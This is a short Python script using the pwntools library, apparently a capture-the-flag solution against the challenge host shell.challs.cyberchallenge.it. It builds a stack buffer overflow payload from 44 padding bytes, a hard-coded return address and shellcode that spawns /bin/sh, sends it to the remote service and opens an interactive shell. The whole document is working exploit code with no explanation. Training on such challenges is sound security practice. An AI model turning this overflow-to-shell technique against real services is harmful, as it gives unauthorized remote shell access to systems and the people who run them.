from pwn import *

HOST = "shell.challs.cyberchallenge.it"
PORT = 9123

p = remote(HOST, PORT)

shellcode = shellcraft.sh()

ret_addr = 0x8048593

payload = fit(b"A"*44, p32(ret_addr), asm(shellcode))

p.sendlineafter("> ", payload)
p.interactive()